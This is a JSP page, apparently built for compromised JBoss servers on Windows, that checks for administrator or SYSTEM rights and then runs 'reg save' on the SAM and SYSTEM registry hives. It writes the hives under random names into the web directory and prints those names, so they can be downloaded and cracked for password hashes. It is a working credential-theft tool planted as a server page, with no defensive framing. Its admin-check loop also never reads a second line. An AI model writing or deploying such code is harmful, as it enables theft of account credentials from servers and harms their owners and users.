<%@ page import="java.net.*, java.io.*" %>
<%@ page import="java.util.*" %>
<%@ page import="java.lang.*" %>
<%@ page import="java.lang.String" %>
<%@ page import="java.security.*" %>
<%@ page import="sun.misc.BASE64Encoder" %>
<%!public String strEncode(String str){sun.misc.BASE64Encoder encoder = new sun.misc.BASE64Encoder();byte[] b1 = str.getBytes();String result = encoder.encode(b1);result = result.replace("==", ""); result = result.replace("=", "");	return result;}%>
<%
Process p;
if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1) // THIS IS SPAR...WINDOWS!!!
{
	p = Runtime.getRuntime().exec("cmd.exe /C net localgroup | findstr *Administrators");
	
	OutputStream os = p.getOutputStream();
	InputStream in = p.getInputStream();
	DataInputStream dis = new DataInputStream(in);
	String disr = dis.readLine();
	boolean isadmin = false;
	
	while ( disr != null ) 
	{
		if ( disr.contains("*Administrators") )
		{
			isadmin = true;
			break;
		}
	}

	if(!isadmin)
	{
		p = Runtime.getRuntime().exec("cmd.exe /C whoami");
		os = p.getOutputStream();
		in = p.getInputStream();
		dis = new DataInputStream(in);
		disr = dis.readLine();
		if( disr.contains("nt authority\\system"))
		{
			isadmin = true;
		}
	}

	if(isadmin)
	{
		int i = 8;
		String getSAMdir = null;
		String jbossroot = System.getProperty("user.dir");
    	jbossroot = jbossroot.replace("bin", "");
    	p = Runtime.getRuntime().exec("cmd.exe /c cd " +  jbossroot + " && dir getSAM.jsp /s | findstr Directory");
    	os = p.getOutputStream();
    	in = p.getInputStream();
    	dis = new DataInputStream(in);
    	disr = dis.readLine();
		getSAMdir = disr.replace("Directory of ", "");
		String key1 = UUID.randomUUID().toString();
		key1 = key1.substring(0,i);
		p = Runtime.getRuntime().exec("cmd.exe /c reg save HKLM\\SAM " + getSAMdir + "\\" + key1);
		os = p.getOutputStream();
    	in = p.getInputStream();
    	dis = new DataInputStream(in);
    	disr = dis.readLine();
    	String key2 = UUID.randomUUID().toString();
    	key2 = key2.substring(0,i);	
		p = Runtime.getRuntime().exec("cmd.exe /c reg save HKLM\\System " + getSAMdir + "\\" + key2);
		os = p.getOutputStream();
    	in = p.getInputStream();
    	dis = new DataInputStream(in);
    	disr = dis.readLine();
    	out.println(key1 + "<>" + key2);
    }
    else
    {
    	out.println(strEncode("ERROR! We are not an admin."));
    }
}
else{
	out.println("Operation Cannot be performed");
}
%>